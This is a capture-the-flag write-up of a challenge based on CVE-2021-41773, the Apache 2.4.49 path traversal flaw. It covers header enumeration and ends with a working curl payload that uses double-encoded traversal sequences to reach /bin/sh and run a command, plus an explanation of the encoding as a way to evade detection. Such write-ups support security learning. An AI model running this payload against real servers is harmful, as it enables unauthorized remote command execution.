## Require-all-denied

Based on: [CVE-2021-41773](https://github.com/thehackersbrain/CVE-2021-41773)



### Description

We found this control panel on the Internet. It seems to be broken. Can you find out more information?

### Enumeration

On the main page, there is nothing interesting but the url seems a bit odd.

> [http://54.160.214.145:1337/cgi-bin/index/](http://54.160.214.145:1337/cgi-bin/index/)

Looks like the server is using apache. Try search the version by look at web header.

:green\_book:Take note:

* [ ] Server: Apache/2.4.49 (Debian)
* [ ] Can't access route "**/cgi-bin**" and gave forbidden (**405**) but can access other  route like "**/cgi-bin/travel"** and "**/cgi-bin/status**"
* [ ] Possible LFI
* [ ] Try search the server vulnerability with keyword "**apache 2.4.49 exploit**"



### Exploit

#### Apache 2.4.49 Exploit

From here, I know that the vulnerabilities lies on path traversal (LFI) and could lead to RCE.

Found payload from the blog above using:

```bash
curl 'http://localhost:1234/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' --data 'echo Content-Type:text/plain; echo; whoami'
```



where the basic idea is to back from previous path using ( **../** ). In the payload, using double encoding to avoid being detected/find a way so the code will work:

* ../ will be .%2e (**%2e** is url encoding equal **.**)
* .%2e will be .%%32%65 (**%32** equal **2** and **%65** equal **e**)
